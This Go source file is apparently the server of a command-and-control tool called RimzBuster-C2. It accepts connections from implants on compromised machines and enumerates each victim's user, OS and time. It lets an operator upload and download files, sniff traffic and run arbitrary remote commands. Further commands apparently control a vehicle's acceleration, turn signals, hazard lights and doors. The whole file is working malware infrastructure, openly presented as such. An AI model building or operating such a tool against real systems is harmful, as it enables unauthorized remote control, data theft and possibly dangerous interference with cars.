package main

import (
	"bufio"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/olekukonko/tablewriter"
	enum "github.com/vengeance1337/RimzBuster-C2/Enum"
	"github.com/vengeance1337/RimzBuster-C2/banner"
	"github.com/vengeance1337/RimzBuster-C2/download"
	"github.com/vengeance1337/RimzBuster-C2/help"
	"github.com/vengeance1337/RimzBuster-C2/media"
	"github.com/vengeance1337/RimzBuster-C2/upload"
)

type Session struct {
	ID          int
	Conn        net.Conn
	ShellActive bool
	Username    string
	OS          string
	TimeZone    string
	LocalTime   string
}

var (
	sessions    = make(map[int]*Session)
	sessionID   = 0
	sessionsMtx sync.Mutex
)

func main() {
    banner.PrintBanner()
    audioFilePath := filepath.Join("..", "media", "f1.mp3")
    if err := media.PlayAudio(audioFilePath); err != nil {
        log.Fatalf("Failed to play audio: %v", err)
    }
	log.Println("[+] Starting RimzBuster server...")
	startServer(":8080")
}


func startServer(address string) {
	listener, err := net.Listen("tcp", address)
	if err != nil {
		log.Fatalf("[-] Failed to start server: %v", err)
	}
	defer listener.Close()

	log.Printf("[+] Server started on %s", address)

	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Printf("[-] Failed to accept connection: %v", err)
			continue
		}

		go func(conn net.Conn) {
			username := enum.GetUsername(conn)
			osInfo := enum.GetOSInfo(conn)
			timeZone := getTimeZone(conn)
			localTime := getLocalTime(conn)

			sessionsMtx.Lock()
			sessionID++
			newSession := &Session{
				ID:          sessionID,
				Conn:        conn,
				ShellActive: false,
				Username:    username,
				OS:          osInfo,
				TimeZone:    timeZone,
				LocalTime:   localTime,
			}
			sessions[sessionID] = newSession
			sessionsMtx.Unlock()
			handleSession(newSession)
		}(conn)
	}
}
func getTimeZone(conn net.Conn) string {
	conn.Write([]byte("timezone\n"))
	return readCompleteResponse(conn)
}

func getLocalTime(conn net.Conn) string {
	conn.Write([]byte("localtime\n"))
	return readCompleteResponse(conn)
}
func handleSession(s *Session) {
	defer func() {
		s.Conn.Close()
		sessionsMtx.Lock()
		delete(sessions, s.ID)
		sessionsMtx.Unlock()
	}()

	for {
		reader := bufio.NewReader(os.Stdin)
		fmt.Print("Rimzbuster> ")
		command, _ := reader.ReadString('\n')
		command = strings.TrimSpace(command)

		if command == "" {
			continue
		}

		if command == "exit" {
			fmt.Println("Quitting RimzBuster")
			os.Exit(0)
		}

		if command == "sessions -l" {
			listSessions()
			continue
		}

		if command == "help" {
			help.ShowHelp()
			continue
		}

		if strings.HasPrefix(command, "sessions -i ") {
			parts := strings.Split(command, " ")
			if len(parts) != 3 {
				fmt.Println("Usage: sessions -i <sessionID>")
				continue
			}

			sessionID, err := strconv.Atoi(parts[2])
			if err != nil {
				fmt.Println("Invalid session ID")
				continue
			}

			sessionsMtx.Lock()
			targetSession, exists := sessions[sessionID]
			sessionsMtx.Unlock()

			if !exists {
				fmt.Printf("Session ID %d does not exist\n", sessionID)
				continue
			}

			interactWithSession(targetSession)
		} else {
			fmt.Println("Unknown command")
		}
	}
}

func listSessions() {
	sessionsMtx.Lock()
	defer sessionsMtx.Unlock()

	table := tablewriter.NewWriter(os.Stdout)
	table.SetHeader([]string{"ID", "Username", "OS", "Time Zone", "Local Time"})

	for _, session := range sessions {
		table.Append([]string{
			strconv.Itoa(session.ID),
			session.Username,
			session.OS,
			session.TimeZone,
			session.LocalTime,
		})
	}

	table.Render()
}

func interactWithSession(s *Session) {
	reader := bufio.NewReader(os.Stdin)
	for {
		fmt.Printf("Session %s> ", s.Username)
		command, _ := reader.ReadString('\n')
		command = strings.TrimSpace(command)

		if command == "exit" {
			fmt.Println("Exiting session interaction!")
			return
		}

		parts := strings.SplitN(command, " ", 2)
		sessionCommand := parts[0]

		switch sessionCommand {
		case "upload":
			if len(parts) < 2 {
				fmt.Println("[!] Usage: upload <localpath> <remotedir>")
				continue
			}
			filePaths := strings.SplitN(parts[1], " ", 2)
			if len(filePaths) != 2 {
				fmt.Println("[!] Usage: upload <localpath> <remotedir>")
				continue
			}
			err := upload.UploadFile(s.Conn, filePaths[0], filePaths[1])
			if err != nil {
				fmt.Printf("[-] Error uploading file: %v\n", err)
			} else {
				fmt.Println("[+] File uploaded successfully")
			}
		case "download":
			if len(parts) < 2 {
				fmt.Println("[!] Usage: download <remotepath> <localpath>")
				continue
			}
			filePaths := strings.SplitN(parts[1], " ", 2)
			if len(filePaths) != 2 {
				fmt.Println("[!] Usage: download <remotepath> <localpath>")
				continue
			}
			err := download.DownloadFile(s.Conn, filePaths[0], filePaths[1])
			if err != nil {
				fmt.Printf("[-] Error downloading file: %v\n", err)
			} else {
				fmt.Println("[+] File downloaded successfully")
			}
        case "sniff":
			s.Conn.Write([]byte("sniff\n"))
			fmt.Println("Sniffing over the next 15 seconds...")
			time.Sleep(15 * time.Second)
			response := readCompleteResponse(s.Conn)
			fmt.Println(response)

        case "accelerate":
            s.Conn.Write([]byte("accelerate\n"))
            fmt.Println("Accelerating to maximum speed ...")

            // Path to the audio file
            audioFilePath := filepath.Join("..", "media", "accelerate.mp3")

            // Start playing audio in a separate goroutine
            var wg sync.WaitGroup
            wg.Add(1)
            go func() {
                defer wg.Done()
                if err := media.PlayAudio(audioFilePath); err != nil {
                    fmt.Printf("Error playing audio: %v\n", err)
                }
            }()

            // Wait for the client to complete the acceleration
            response := readCompleteResponse(s.Conn)
            fmt.Println(response)

            // Wait for the audio to finish
            wg.Wait()

        case "leftsignal":
            s.Conn.Write([]byte("leftsignal\n"))
            fmt.Println("Indicating Left[!]")
            time.Sleep(10 * time.Second)
            response := readCompleteResponse(s.Conn)
            fmt.Println(response)

        case "rightsignal":
            s.Conn.Write([]byte("rightsignal\n"))
            time.Sleep(10 * time.Second)
            response := readCompleteResponse(s.Conn)
            fmt.Println(response)

        case "hazard":
            s.Conn.Write([]byte("hazard\n"))
            fmt.Println("Starting Hazard Lights[!]")
            time.Sleep(10 * time.Second)
            response := readCompleteResponse(s.Conn)
            fmt.Println(response)

        case "dooropen":
            s.Conn.Write([]byte("dooropen\n"))
            fmt.Println("Executing Door Open[!]")
            response := readCompleteResponse(s.Conn)
            fmt.Println(response)

        case "doorclose":
            s.Conn.Write([]byte("doorclose\n"))
            fmt.Println("Executing Door Close[!]")
            response := readCompleteResponse(s.Conn)
            fmt.Println(response)

		default:
			s.Conn.Write([]byte(command + "\n"))
			response := readCompleteResponse(s.Conn)
			fmt.Println(response)
		}
	}
}

func readCompleteResponse(conn net.Conn) string {
	reader := bufio.NewReader(conn)
	var response strings.Builder
	for {
		line, err := reader.ReadString('\n')
		if err != nil {
			if err == io.EOF {
				break
			}
			return fmt.Sprintf("Error reading response: %v", err)
		}
		if line == "EOF\n" {
			break
		}
		response.WriteString(line)
	}
	return response.String()
}
